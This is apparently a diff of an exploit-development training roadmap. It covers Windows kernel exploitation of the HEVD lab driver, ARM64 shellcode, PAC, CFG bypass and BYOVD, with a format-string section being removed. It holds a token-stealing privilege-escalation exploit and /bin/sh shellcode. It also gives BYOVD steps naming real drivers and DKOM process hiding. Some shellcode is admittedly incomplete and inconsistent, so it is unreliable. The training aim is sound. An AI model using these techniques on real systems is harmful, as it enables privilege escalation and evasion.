+    // After kernel ROP, return via trampoline instead of bare iretq:
+    unsigned long kpti_trampoline = KASLR_BASE + TRAMPOLINE_OFFSET;
+    // Push: rip, cs, rflags, rsp, ss in that order, then jump to trampoline
 ```
-
----
-
-### Phase 3: Milestones Checklist
-
-- [ ] LiveOverflow series: every video watched and coded
-- [ ] ROP Emporium: all 8 challenges complete
-- [ ] Written `/bin/sh` shellcode from scratch (null-free, x86-64)
-- [ ] Stack overflow: no protections → full exploit
-- [ ] Stack canary bypass: leaked and preserved
-- [ ] ASLR bypass: information leak → ROP → shell
-- [ ] Heap exploitation: use-after-free in practice challenge
-- [ ] Kernel exploit: privilege escalation from user → root
-- [ ] Analyzed real CVE: root cause understood, custom PoC written
-- [ ] 10+ pwnable.kr challenges solved
-
----
-
-## FORMAT STRING VULNERABILITIES
-
-**Time:** 1–2 weeks | **MITRE:** T1203
 
 ```c
-// Vulnerable code:
-printf(user_input);         // Never do this: write fmt string explicitly
-// Safe:
-printf("%s", user_input);   // fmt string is controlled
+// KPTI-aware return to userspace (after kernel ROP):
+unsigned long user_rip    = (unsigned long)post_exploit_func;
+unsigned long user_cs     = saved_cs;    // save before entering kernel
+unsigned long user_rflags = saved_rflags; // save with: __asm__("pushfq; pop %0")
+unsigned long user_rsp    = saved_rsp;
+unsigned long user_ss     = saved_ss;
 
-// Format string attack: user_input = "%x %x %x %x %x %x %x"
-// printf reads args from stack → leak stack contents
-// User_input = "%s" → read memory at next stack address
-// User_input = "%n" → WRITE to address on stack (bytes written count)
+// In the ROP chain, call the KPTI trampoline:
+// swapgs_restore_regs_and_return_to_usermode will:
+//   1. swapgs (restore user GS base)
+//   2. iretq with: rip, cs, rflags, rsp, ss from the provided frame
+// This cleanly transitions back to user mode without crashing
+```
 
-// Step 1: Find offset (how many %p until you see your input)
-python3 -c "print('AAAA' + '.%p'*50)" | ./target
-# Look for: 0x41414141 (ASCII AAAA) in output
-# Count: that position is the offset
+---
 
-# Step 2: Leak addresses
-python3 -c "print('%15\$p')" | ./target  # 15th argument = stack value 15
+## 8. WINDOWS KERNEL EXPLOITATION ← REBUILT FROM SCRATCH
 
-# Step 3: Arbitrary write with %n
-# %n writes (number of chars printed so far) to address in arg
-# Technique: write one byte at a time using %hhn (halfword-halfword)
+### Time: 4–6 weeks | Difficulty: Extreme
 
+> This section was nearly absent in the original roadmap. It is now a first-class section. If you can root Linux kernels but not Windows kernel drivers, you cannot touch enterprise targets.
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [HEVD - HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | GitHub | 30 hrs | FREE | **THE standard Windows kernel training target. Required.** |
+| [Windows Kernel Exploitation Workshop](https://github.com/rootkits-xyz/Windows-Kernel-Exploits) | GitHub | 10 hrs | FREE | Exploit collection with write-ups. Study each one. |
+| [Connor McGarr - Kernel Exploitation](https://connormcgarr.github.io/) | Blog | 8 hrs | FREE | Excellent write-ups on modern Windows kernel techniques. |
+| [Alex Ionescu - Windows Internals](https://www.youtube.com/watch?v=dhjvLEHiGBM) | YouTube | 3 hrs | FREE | Architecture context before exploiting. |
+
+### Step 1: WinDbg Kernel Debugging Setup
+
+```
+SETUP REQUIRED: Two Windows VMs
+  VM1 (DEBUGGER): runs WinDbg, connects to VM2
+  VM2 (TARGET):   runs HEVD, gets exploited
+
+VM2 Configuration (TARGET: run these as Administrator):
+
+  # Enable kernel debugging over COM port (serial):
+  bcdedit /debug on
+  bcdedit /dbgsettings serial debugport:1 baudrate:115200
+  # OR use network debugging (easier in VMware/VirtualBox):
+  bcdedit /dbgsettings net hostip:<VM1_IP> port:50000 key:1.2.3.4
+
+  # Disable driver signature enforcement (for loading HEVD):
+  # Reboot → Advanced Boot → Disable Driver Signature Enforcement
+  # OR permanently (test environment only!):
+  bcdedit /set testsigning on
+  bcdedit /set nointegritychecks on
+
+  # Reboot VM2
+
+VM1 Configuration (DEBUGGER):
+  # WinDbg Preview → File → Attach to Kernel → COM or Net tab
+  # COM: \\.\pipe\com1 (if using VMware virtual serial pipe)
+  # Net: hostip:port with key from bcdedit above
+  # Click OK → WinDbg says "Waiting to reconnect..."
+  # Boot VM2 → WinDbg connects automatically
+```
+
+```
+Essential WinDbg Kernel Commands:
+
+g                       -- Go (continue execution)
+Ctrl+Break              -- Break into debugger
+lm                      -- List loaded modules (drivers)
+lm m HEVD               -- Show HEVD.sys base address
+.reload                 -- Reload module symbols
+!analyze -v             -- Analyze crash/bugcheck
+
+Process inspection:
+!process 0 0            -- List all processes
+!process 0 7            -- List all processes with threads and stacks
+dt nt!_EPROCESS         -- Show EPROCESS structure layout
+dt nt!_EPROCESS <addr>  -- Show specific process's EPROCESS
+
+Token inspection:
+dt nt!_TOKEN            -- Token structure layout
+!token <token_addr>     -- Decode a token
+dt nt!_EPROCESS @$proc  -- Current process EPROCESS
+?? ((nt!_EPROCESS*)@$proc)->Token.Value  -- Current process token address
+
+Memory:
+dd <addr>               -- Display DWORDs (4-byte) at address
+dq <addr>               -- Display QWORDs (8-byte) at address
+db <addr> L100          -- Display 100 bytes at address
+u <addr>                -- Unassemble code at address
+eq <addr> <value>       -- Write QWORD to address
+
+Breakpoints:
+bp nt!NtCreateFile      -- Break on kernel function
+ba r4 <addr>            -- Break on memory READ at address (hardware bp)
+ba w4 <addr>            -- Break on memory WRITE at address
+bl                      -- List breakpoints
+bc *                    -- Clear all breakpoints
+```
+
+### Step 2: Install and Load HEVD
+
+```bash
+# On VM2 (TARGET):
+# Download HEVD from https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
+# Build in Visual Studio (or use pre-built .sys from releases)
+
+# Load the driver:
+# Option 1: OSR Driver Loader (GUI)
+# Option 2: sc command:
+sc create HEVD type= kernel binPath= C:\HEVD\HEVD.sys
+sc start HEVD
+
+# Verify in WinDbg (VM1):
+lm m HEVD
+# Should show: HEVD image base and size
+
+# HEVD creates a device: \\.\HackSysExtremeVulnerableDriver
+# Communicate via DeviceIoControl with specific IOCTL codes
+# Each IOCTL triggers a different vulnerability type
+```
+
+### Step 3: Stack Overflow in Kernel Driver → Token Stealing
+
+```c
+// HEVD Stack Buffer Overflow (IOCTL: 0x222003)
+// Vulnerable kernel function:
+NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
+    UCHAR KernelBuffer[512];   // 512 bytes on the KERNEL STACK
+    RtlCopyMemory(KernelBuffer, UserBuffer, Size);  // No bounds check!
+    // This copies Size bytes from userspace into a 512-byte kernel buffer
+    // If Size > 512: overflow → corrupt saved return address on kernel stack
+}
+```
+
+```python
+# Python exploit for HEVD Stack Overflow + Token Stealing (Windows 10 x64)
+# Run on VM2 (TARGET)
+
+import ctypes
+import sys
+from ctypes import windll, wintypes
+
+# ── Constants ─────────────────────────────────────────────────────────────────
+GENERIC_READ         = 0x80000000
+GENERIC_WRITE        = 0x40000000
+OPEN_EXISTING        = 3
+FILE_ATTRIBUTE_NORMAL = 0x80
+IOCTL_STACK_OVERFLOW = 0x222003
+
+# ── Open device handle ────────────────────────────────────────────────────────
+device = windll.kernel32.CreateFileW(
+    "\\\\.\\HackSysExtremeVulnerableDriver",
+    GENERIC_READ | GENERIC_WRITE,
+    0, None, OPEN_EXISTING,
+    FILE_ATTRIBUTE_NORMAL, None
+)
+assert device != -1, f"CreateFile failed: {windll.kernel32.GetLastError()}"
+print(f"[+] Device handle: {hex(device)}")
+
+# ── Token Stealing Shellcode (x64) ───────────────────────────────────────────
+# Logic:
+# 1. Get current EPROCESS via GS:[0x188] (KPCR → KPRCB → CurrentThread → EPROCESS)
+# 2. Walk EPROCESS.ActiveProcessLinks to find System process (PID=4)
+# 3. Copy System's Token to current process's Token field
+# 4. Return cleanly
+
+token_stealing_shellcode = bytearray([
+    # Save registers
+    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  # mov rax, gs:[0x188] (KTHREAD)
+    0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,               # mov rax, [rax+0xB8] (EPROCESS)
+    0x48, 0x89, 0xC1,                                         # mov rcx, rax (save current EPROCESS)
+
+    # Walk process list to find System (PID=4)
+    # EPROCESS.ActiveProcessLinks offset = 0x448 (Windows 10 22H2)
+    # EPROCESS.UniqueProcessId offset    = 0x440 (Windows 10 22H2)
+    # EPROCESS.Token offset              = 0x4B8 (Windows 10 22H2)
+    # NOTE: These offsets CHANGE between Windows builds: verify with WinDbg:
+    # dt nt!_EPROCESS → find UniqueProcessId, ActiveProcessLinks, Token offsets
+
+    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,   # mov rax, [rax+0x448] (Flink: next process)
+    0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,           # sub rax, 0x448 (back to EPROCESS base)
+    0x48, 0x39, 0x98, 0x40, 0x04, 0x00, 0x00,     # cmp [rax+0x440], rbx (PID == 4?)
+    # ... loop until PID=4 found (full shellcode: see HEVD write-ups for complete version)
+
+    # Copy System token to current process:
+    0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00,   # mov rax, [rax+0x4B8] (System's Token)
+    0x48, 0x89, 0x81, 0xB8, 0x04, 0x00, 0x00,   # mov [rcx+0x4B8], rax (copy to current process)
+
+    # Return from shellcode
+    0x48, 0x31, 0xC0,  # xor rax, rax (STATUS_SUCCESS = 0)
+    0xC3               # ret
+])
+
+# IMPORTANT: Use a complete, verified shellcode from HEVD exploit examples
+# The above is illustrative: build offsets for your exact Windows build
+# Get offsets: in WinDbg → dt nt!_EPROCESS → read UniqueProcessId, Token offsets
+
+# ── Allocate executable shellcode in userspace ───────────────────────────────
+shellcode_size = len(token_stealing_shellcode)
+shellcode_addr = windll.kernel32.VirtualAlloc(
+    None, shellcode_size,
+    0x1000 | 0x2000,   # MEM_COMMIT | MEM_RESERVE
+    0x40               # PAGE_EXECUTE_READWRITE
+)
+ctypes.memmove(shellcode_addr, bytes(token_stealing_shellcode), shellcode_size)
+print(f"[+] Shellcode at: {hex(shellcode_addr)}")
+
+# ── Build payload ─────────────────────────────────────────────────────────────
+# Offset to return address on HEVD kernel stack: find with WinDbg
+# bp HEVD!TriggerStackOverflow → break → inspect stack → find saved RIP distance
+offset = 2072    # 512 (buffer) + padding to saved RIP (verify with WinDbg for your build)
+
+payload  = b'A' * offset
+payload += ctypes.c_uint64(shellcode_addr).value.to_bytes(8, 'little')
+
+buf = ctypes.create_string_buffer(payload)
+bytes_returned = wintypes.DWORD()
+
+windll.kernel32.DeviceIoControl(
+    device,
+    IOCTL_STACK_OVERFLOW,
+    buf, len(payload),
+    None, 0,
+    ctypes.byref(bytes_returned),
+    None
+)
+
+# ── Spawn SYSTEM shell ────────────────────────────────────────────────────────
+import subprocess
+proc = subprocess.Popen(['cmd.exe'], shell=True)
+proc.wait()
+# whoami → nt authority\system
+```
+
+### Step 4: Kernel Pool Exploitation
+
+```
+Windows Kernel Pool (equivalent to Linux kernel SLUB/SLAB):
+  - Non-Paged Pool (NpPool): physically-mapped pages, always present in RAM
+  - Paged Pool (PagedPool): can be paged to disk
+  - Non-Paged Pool NX (NpPool NX): non-executable, Windows 8+
+
+Pool Chunk Header (before Windows 8):
+  struct POOL_HEADER {
+      ULONG   PreviousSize : 8;    // size of previous chunk
+      ULONG   PoolIndex    : 8;    // pool index
+      ULONG   BlockSize    : 8;    // size of this chunk
+      ULONG   PoolType     : 8;    // NpPool, PagedPool, etc.
+      ULONG   PoolTag;             // 4-byte debug tag (e.g., 'Thrd', 'File')
+      PVOID   ProcessBilled;       // only in some pool types
+  };
+
+Pool Overflow Technique (classic, Windows 7 era: educational baseline):
+  1. Spray pool with many predictably-sized objects
+  2. Trigger vulnerability that overflows a pool chunk
+  3. Corrupt adjacent chunk's header (PoolType, size, or tag)
+  4. When adjacent chunk is freed: corrupt free list
+  5. Next allocation returns attacker-controlled address
+  6. Write shellcode or function pointer overwrite
+
+Modern Pool Security (Windows 10 RS3+):
+  - Encoded chunk headers (XOR with random cookie) → harder to corrupt reliably
+  - Low-fragmentation allocations → less adjacency control
+  - Safe Unlinking checks (like glibc) → detect corrupted pointers
+  Modern approach: focus on TYPE CONFUSION via pool spraying
+  (allocate same-size objects of different types → type confusion when referenced)
+
+Resources for pool exploitation:
+  - "Sheep Year Kernel Bugs: Adventures in Nt Kernel Exploitation" (SyScan 2015)
+  - Morten Schenk's "Taking Windows 10 Kernel Exploitation to the Next Level" (DEF CON 25)
+  - Search: "Windows pool exploitation 2023 2024" for modern techniques
+```
+
+### Step 5: DKOM and BYOVD
+
+```c
+// DKOM: Direct Kernel Object Manipulation (HVCI-survivable)
+// No code execution in kernel needed: manipulate DATA STRUCTURES
+
+// DKOM Examples:
+// 1. Hide a process: remove its EPROCESS from ActiveProcessLinks
+//    → Process disappears from tasklist, Process Explorer, etc.
+// 2. Elevate privileges: modify EPROCESS.Token pointer
+//    → Current process now has SYSTEM token
+// 3. Clear PPL (Protected Process Light):
+//    → Modify EPROCESS.Protection byte → allows memory access to protected processes
+
+// BYOVD: Bring Your Own Vulnerable Driver
+// Deploy a legitimately-signed but vulnerable driver
+// Use its vulnerability to get kernel R/W
+// Then use DKOM (no shellcode execution needed: just data write)
+// Survives HVCI because: the driver IS signed (HVCI only blocks unsigned code)
+
+// LOLDrivers database: https://www.loldrivers.io/
+// Database of legitimately-signed drivers with known exploitable vulnerabilities
+// Examples:
+//   - Gigabyte APP Center driver (arbitrary kernel R/W)
+//   - MSI Afterburner (arbitrary kernel R/W)
+//   - Intel Network Adapter Diagnostic (IOCTL)
+
+// BYOVD workflow:
+// 1. Drop legitimate signed vulnerable .sys file
+// 2. Load it (sc create / ZwLoadDriver)
+// 3. Use its vulnerable IOCTL to get kernel arbitrary R/W
+// 4. DKOM: read EPROCESS.Token of System process, write to current EPROCESS
+// 5. Unload driver (sc stop, sc delete): no persistent kernel changes
+// 6. Shell is now SYSTEM
+
+// This is what Lazarus Group used in 2022 (Dell driver CVE-2021-21551)
+// This is what BlackCat ransomware used (RTCore64 driver)
+```
+
+---
+
+## 9. ARM64 EXPLOITATION ← NEW - CRITICAL FOR 2027
+
+### Time: 2–3 weeks | Difficulty: Very Hard
+
+> By 2027, ARM64 is everywhere: every iPhone, every Android flagship, every M-series Mac (covered in Phase 4E), AWS Graviton, Azure Ampere cloud servers. If your exploitation knowledge is x86-64 only, you cannot touch half the real-world targets.
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [ARM Architecture Reference Manual](https://developer.arm.com/documentation/ddi0487/latest/) | Docs | 10 hrs | FREE | The authoritative ARM64 spec. Use as reference. |
+| [pwn.college AArch64 challenges](https://pwn.college) | Platform | 8 hrs | FREE | Some modules include ARM64 targets. |
+| [Azeria Labs - ARM Intro](https://azeria-labs.com/writing-arm-assembly-part-1/) | Blog | 5 hrs | FREE | Best beginner ARM assembly series. |
+| [iOS Kernel Heap Exploitation - Project Zero](https://googleprojectzero.blogspot.com/) | Blog | 4 hrs | FREE | Advanced but shows real-world ARM64 exploitation. |
+
+### AArch64 Architecture vs x86-64
+
+```
+Registers:
+  x86-64:     16 general-purpose registers (RAX, RBX, ... R15), each 64-bit
+  AArch64:    31 general-purpose registers (X0–X30), each 64-bit
+              W0–W30 = lower 32 bits of X0–X30 (like EAX vs RAX)
+              X30 = Link Register (LR): stores return address on CALL
+              SP = stack pointer (separate from general regs)
+              PC = program counter (cannot access directly in most instructions)
+
+Calling Convention (AArch64 Linux AAPCS64):
+  Arguments:  X0–X7 (first 8 args; beyond 8: pushed on stack)
+  Return:     X0 (or X0:X1 for 128-bit values)
+  Caller-saved:   X0–X18 (must save if you need them across a call)
+  Callee-saved:   X19–X28 (must restore before returning)
+  Special:    X29 = frame pointer (FP), X30 = link register (LR)
+
+Key instruction differences:
+  x86-64: CALL <addr>        pushes RIP, jumps to addr
+  AArch64: BL <addr>          stores PC+4 in X30, jumps to addr (no stack push!)
+           BLR X8             branch-with-link to address in X8
+
+  x86-64: RET                pops RIP from stack
+  AArch64: RET               jumps to address in X30 (LR)
+           RET X8             jumps to X8 (explicit register)
+
+  x86-64: MOV RAX, [RSP+8]
+  AArch64: LDR X0, [SP, #8]  (load from SP+8 into X0)
+           LDR X0, [X1, #0]  (load from X1 into X0)
+           STP X0, X1, [SP, #-16]!  (store pair, pre-decrement SP: function prologue)
+           LDP X0, X1, [SP], #16    (load pair, post-increment SP: function epilogue)
+```
+
+### ARM64 Syscalls (Linux AArch64)
+
+```nasm
+; ARM64 Linux syscall calling convention:
+; syscall number → X8
+; arg1 → X0, arg2 → X1, arg3 → X2
+; execute: SVC #0 instruction
+;
+; Key syscall numbers (AArch64 Linux: different from x86-64!):
+;  63  = read
+;  64  = write
+;  93  = exit
+; 221  = execve     ← execve is 221 on ARM64 (NOT 59 like x86-64)
+; 281  = execveat
+
+; ── execve("/bin/sh", NULL, NULL) shellcode (ARM64 Linux) ────────────────────
+.section .text
+.global _start
+_start:
+    // Set X8 = 221 (execve syscall number on ARM64)
+    mov x8, #221
+
+    // Set X2 = 0 (envp = NULL)
+    mov x2, xzr             // xzr = always-zero register (ARM64 has this!)
+
+    // Set X1 = 0 (argv = NULL)
+    mov x1, xzr
+
+    // Build "/bin/sh" string on stack:
+    // "/bin/sh\0" = 0x0068732f6e69622f  (same bytes as x86-64)
+    // ARM64 stack grows downward (same as x86-64)
+    mov x0, #0x622f          // "/b"
+    movk x0, #0x6e69, lsl #16  // "in"
+    movk x0, #0x732f, lsl #32  // "/s"
+    movk x0, #0x0068, lsl #48  // "h\0"
+    str x0, [sp, #-16]!     // push to stack (16-byte aligned decrement)
+    mov x0, sp              // X0 = pointer to "/bin/sh\0"
+
+    // Execute syscall
+    svc #0
+```
+
+```bash
+# Assemble and test ARM64 shellcode:
+
+# Using aarch64 cross-compiler on x86-64 Ubuntu:
+sudo apt install gcc-aarch64-linux-gnu qemu-user
+
+# Assemble:
+aarch64-linux-gnu-as shellcode.S -o shellcode.o
+aarch64-linux-gnu-ld shellcode.o -o shellcode
+
+# Run via QEMU user-mode emulation:
+qemu-aarch64 ./shellcode   # should spawn /bin/sh
+
+# Or use pwntools:
 from pwn import *
-p = process('./target')
-# Direct parameter access: 8th param = target address
-target_addr = 0x404020    # e.g., GOT entry for exit()
-new_value = 0xdeadbeef
+context.arch = 'aarch64'
+context.os   = 'linux'
+sc = asm(shellcraft.aarch64.linux.sh())
+print(enhex(sc))
+print(f"Length: {len(sc)} bytes")
+```
 
-# Build format string payload
-payload = fmtstr_payload(8, {target_addr: new_value})
-p.sendline(payload)
-p.interactive()  # exit() now calls 0xdeadbeef
+### PAC - Pointer Authentication Codes
+
+```
+What PAC is:
+  PAC is a hardware security feature on ARM64 systems:
+  - ARMv8.3-A (Apple A12+, all M-series Macs, Cortex-A55+)
+  - Stores a cryptographic signature in the UNUSED HIGH BITS of a pointer
+  - Before dereferencing a pointer, CPU verifies the signature
+  - If signature doesn't match → CPU generates a BAD ADDRESS → fault
+
+  Two key instructions:
+    PACIA X0, X1   (Pointer Authentication Code for Instruction address)
+    AUTIA X0, X1   (Authenticate Instruction address: verify before use)
+    
+    PACIB, AUTIB   (B variants use a different key)
+    PACDA, AUTDA   (D variants for data pointers)
+    PACDZA         (with zero context)
+
+  Why this matters for exploitation:
+  - Stack-based ROP is much harder: saved LR (X30) is signed before storing
+    BL pushes PACIA(LR, SP) → the stored value is NOT a raw address
+    RET does AUTIA(LR, SP) → if you overwrote LR with an unsigned value → fault
+  - On iPhone: you cannot overwrite a return address and return to arbitrary code
+    WITHOUT a PAC bypass
+
+PAC Bypass Primitives:
+  1. Forge using kernel vulnerability (if running in kernel context, you have the key)
+  2. Reuse an authenticated pointer (find a signed pointer that already points near your target)
+  3. Oracle attack: find a code path that signs attacker-controlled values, use as forge oracle
+     (rare: vendors look for these specifically)
+  4. Infoleak of the key (key is stored in system registers, leaked via certain kernel vulns)
+  5. Software bypass: find code path that strips PAC (XPACI/XPACD instructions)
+     before branching; corrupted pointer accepted if XPACI is applied to it
+
+Practical for Phase 3:
+  - Run ARM64 exploitation on Linux on QEMU (ARM64 Linux with PAC disabled or enabled)
+  - Understanding PAC conceptually is mandatory for Phase 4E (macOS Apple Silicon)
+  - Full PAC bypass research: see Project Zero blogs on iOS jailbreaking
+
+ARM64 Stack Overflow Example (without PAC: for learning):
+from pwn import *
+context.arch = 'aarch64'
+
+# Find offset: same cyclic approach as x86-64
+# But: instead of watching RIP, watch X30 (link register) on fault
+
+p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', './arm64_vuln'])
+p.sendline(cyclic(200))
+p.wait()
+core = p.corefile
+# pwndbg: cyclic_find with the crashed X30 value
+offset = cyclic_find(core.x30)
+log.success(f"Offset to X30: {offset}")
 ```
 
 ---
 
-## WINDOWS HEAP EXPLOITATION
+## 10. CONTROL FLOW GUARD (CFG) BYPASS ← NEW - WAS LISTED, NEVER TAUGHT
 
-**Time:** 3–4 weeks | **Difficulty:** Extreme
+### Time: 1–2 weeks | Difficulty: Extreme
 
-Windows heap is fundamentally different from glibc. NT Heap (LFH), Segment Heap (Win10+), Page Heap for debug.
+> The original roadmap listed CFG bypass as a Phase 3 exit requirement but provided zero curriculum. Fixed here.
 
-| Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [Windows Heap Exploitation](https://www.youtube.com/results?search_query=windows+heap+exploitation+2024) | YouTube | 5 hours | FREE | Multiple talks, various techniques. |
-| [Heaps of Pwning](https://www.youtube.com/watch?v=bthQKxXqHqc) | YouTube | 1.5 hours | FREE | Windows heap internals talk. |
-
-```
-Windows Heap Structures:
-
-NT Heap (legacy, Windows <8):
-  - Front-end allocator: Lookaside Lists (fast, limited check)
-  - Back-end allocator: Free Lists (ListHints, FreeList[x])
-  - Each heap has header: HEAP structure
-  - Each allocation: HEAP_ENTRY (8-byte header, prev/size/flags)
-
-Segment Heap (Windows 10 RS5+):
-  - Low Fragmentation Heap (LFH): buckets by size, randomized
-  - Variable Size (VS): chunks with HEAP_VS_CHUNK_HEADER
-  - Large Allocation (>512KB): directly MmMapViewSection
-  - Segment Allocator: segments of committed pages
-
-Attack vectors:
-  1. Heap overflow: corrupt HEAP_ENTRY size/flags → controlled size
-     → on free: incorrect coalescing → write to attacker-controlled address
-  
-  2. Use-After-Free: free chunk → HeapAlloc of same size → fill with
-     controlled data → dereference as original type → type confusion
-  
-  3. LFH exploit: fill LFH bucket → free → allocate different type
-     in same bucket slot → type confusion (requires shaping)
-
-Tools:
-  - Process Hacker: inspect heap in real-time
-  - WinDbg: !heap, dt _HEAP, dt _HEAP_ENTRY
-  - PageHeap: gflags /p /enable target.exe /full
-  - Dragon Dance (heap visualization): https://github.com/corkami/mitra
-```
-
----
-
-## LINUX eBPF ROOTKITS
-
-**Time:** 4–6 weeks | **MITRE:** T1014 | **Detection:** Very hard
-
-eBPF (extended Berkeley Packet Filter) is the modern Linux kernel extension mechanism. Originally for networking and observability, now abused for rootkits that are nearly invisible.
+### Resources
 
 | Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [eBPF Security - BlackHat](https://www.youtube.com/results?search_query=ebpf+security+blackhat) | YouTube | 4 hours | FREE | Multiple talks on eBPF security implications. |
-| [Tetragon (Cilium)](https://github.com/cilium/tetragon) | GitHub | 3 hours | FREE | Study the defensive side to understand offensive potential. |
-| [ebpfkit](https://github.com/Gui774ume/ebpfkit) | GitHub | 5 hours | FREE | eBPF rootkit reference implementation. Study the source. |
+|---|---|---|---|---|
+| [Connor McGarr - CFG Deep Dive](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) | Blog | 3 hrs | FREE | Best technical CFG explanation. |
+| [Matt Miller - Preventing the Exploitation of Memory Corruption](https://media.blackhat.com/us-13/US-13-Miller-Securing-the-Windows-Kernel-with-HVCI.pdf) | PDF | 2 hrs | FREE | Original CFG design paper (Miller/Microsoft). |
+| [Project Zero - CFG is Not a Silver Bullet](https://googleprojectzero.blogspot.com/2015/10/cve-2015-6764-unexpected-journey-into.html) | Blog | 2 hrs | FREE | CFG bypass techniques. |
+
+### How CFG Works Internally
+
+```
+CFG (Control Flow Guard): Windows 8.1 Update 3+ / Server 2016+:
+
+Goal: prevent ROP and function pointer exploitation by validating
+      indirect call/jump targets before executing them.
+
+Compiler side (at compile time):
+  - MSVC builds a bitmap of all valid indirect call targets in the module
+  - Every indirect CALL and JMP is preceded by:
+      call _guard_check_icall_nop    ; check if target is valid
+      call rax                        ; actual call
+  OR (in newer versions with /guard:cf):
+      call __guard_check_icall_fptr  ; check and call in one operation
+
+Runtime (at load time):
+  - ntdll reads the CFG bitmap from the PE's .gfids section
+  - Bitmap is stored in a shared section: ntdll!LdrpGuardCFGBitMap
+  - Each bit represents 8 bytes of virtual address space
+  - Bit = 1 → address is a valid indirect call target
+  - Bit = 0 → address is NOT a valid target → _guard_dispatch_icall_fptr → process termination
+
+The check:
+  // Pseudo-code of __guard_check_icall_nop:
+  void __guard_check_icall(void *target) {
+      uintptr_t offset = (uintptr_t)target >> 3;   // divide by 8 (each bit = 8 bytes)
+      if (!bitmap[offset / 8] & (1 << (offset % 8))) {
+          // Target not in bitmap → abort
+          __fastfail(FAST_FAIL_GUARD_ICALL_CHECK_FAILURE);  // instant process kill
+      }
+      // If we get here: target is CFG-valid → allow the call
+  }
+```
+
+### CFG Bypass Technique 1: Use a CFG-Valid Target
 
 ```c
-// eBPF rootkit: hide files via tracepoint hook
-// Requires: CAP_BPF / CAP_SYS_ADMIN (root or privileged container)
-// Advantage: no kernel module, no disk artifact, survives across kernel versions
+// The simplest CFG bypass: don't use an invalid target.
+// ALL exported functions are CFG-valid (they're valid indirect call targets)
+// All publicly-known function pointers in DLLs are valid
 
-// Hook getdents64 to filter directory entries
-// Everything runs in the kernel, verified by eBPF verifier
+// The attacker's job: corrupt a function pointer to point to a DIFFERENT
+// valid function that achieves the goal when called with the right arguments.
+
+// Example: 
+// Target has a vtable function pointer. CFG checks before calling it.
+// If we corrupt it to point to: kernelbase!WinExec  (a valid exported function)
+// And the call site passes a controllable string as first argument...
+// → CFG check passes (WinExec is a valid target) → WinExec("cmd.exe", 1) runs
+
+// Finding useful valid targets:
+// 1. List all exports of loaded DLLs (dumpbin /exports kernel32.dll)
+// 2. Find functions that:
+//    - Accept arguments in a position your call site controls (first arg = RCX on x86-64)
+//    - Execute interesting code (shell, file operations, network)
+// 3. Pivot to that target
+
+// Tools:
+// ROPfuscator: https://github.com/ropfuscator/ropfuscator (find CFG-valid gadgets)
+// WinObjEx64: inspect CFG bitmap entries
+```
+
+### CFG Bypass Technique 2: Modify the CFG Bitmap
+
+```c
+// If you have arbitrary kernel write (e.g., via BYOVD or kernel exploit):
+// You can ADD entries to the CFG bitmap, making any address "valid"
+
+// The CFG bitmap is in a special memory section (ntdll!LdrpGuardCFGBitMap)
+// It's shared read-only with user mode for fast checks
+// But: WRITEABLE from kernel mode
+
+// From kernel:
+// 1. Find the bitmap address (from ntdll exports or PEB)
+// 2. Map the section writable
+// 3. Set the bit corresponding to your shellcode's address
+// → Your shellcode is now a "valid" CFG target → CFG check passes
+
+// Alternatively: use SetProcessValidCallTargets() from usermode
+// (this is a documented API: intended for JIT compilers)
+// Requires: the process has JIT → you're in the JIT execution context
+
+BOOL SetProcessValidCallTargets(
+    HANDLE hProcess,
+    PVOID VirtualAddress,
+    SIZE_T RegionSize,
+    ULONG NumberOfOffsets,
+    PCFG_CALL_TARGET_INFO OffsetInformation  // set CFG_CALL_TARGET_VALID flag
+);
+
+// Attackers with code exec use this to mark their shellcode as a valid target
+// Then corrupt a function pointer → call goes to shellcode → CFG passes
+```
+
+### CFG Bypass Technique 3: JIT Spraying
+
+```c
+// JIT (Just-In-Time) compiled code is dynamically generated
+// JIT compilers call SetProcessValidCallTargets() to mark JIT pages as valid
+// → All JIT-compiled pages have their ENTIRE address range marked CFG-valid
+
+// JIT spray: craft malicious inputs to the JIT compiler
+// The JIT produces code that contains your ROP gadgets / shellcode
+// These pages are already CFG-valid (compiler marked them)
+// Corrupt a function pointer to point INTO a JIT page at an interesting gadget
+
+// Targets: JavaScript engines (Chakra, V8, SpiderMonkey), .NET JIT, Java JIT
+// Classic: ChakraCore/Edge JIT spray (CVE-2016-7190 and many others)
+// Required reading: "ROT: Return-Oriented Shellcode with JIT-Spraying" (Blazakis 2010)
+```
+
+### CFG Bypass Technique 4: Type Confusion
+
+```c
+// Type confusion: access an object via a different type than it was allocated as
+// If the confusion lands on a virtual function table (vtable) pointer:
+//   → You effectively have function pointer corruption
+//   → The function is called via the vtable
+//   → If it's a CFG-valid function in the right calling convention: bypass
+
+// Example:
+struct TypeA { TypeAVtable *vtable; int data; };
+struct TypeB { TypeBVtable *vtable; char buf[16]; };
+
+// Vulnerability: free(TypeA) → re-allocate TypeB → use via TypeA pointer
+TypeA *confused = (TypeA*)new_TypeB;
+confused->vtable->some_method(confused);  // calls TypeB vtable method as if TypeA
+// → if TypeB vtable method is a useful CFG-valid function → code exec
+
+// CFG only checks that the call TARGET is in the bitmap
+// It doesn't check that you're calling the RIGHT method for the RIGHT object
+// Type confusion bypasses CFG's intent without violating its check
+```
+
+---
+
+## 11. LINUX eBPF ROOTKITS
+
+### Time: 4–6 weeks | MITRE: T1014 | Detection: Extreme Difficulty
+
+eBPF (extended Berkeley Packet Filter) is the modern Linux kernel extension mechanism. Originally designed for networking and observability, now abused for nearly-undetectable rootkits. No kernel module required. No disk artifact in most cases. Survives across kernel versions.
+
+### Resources
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
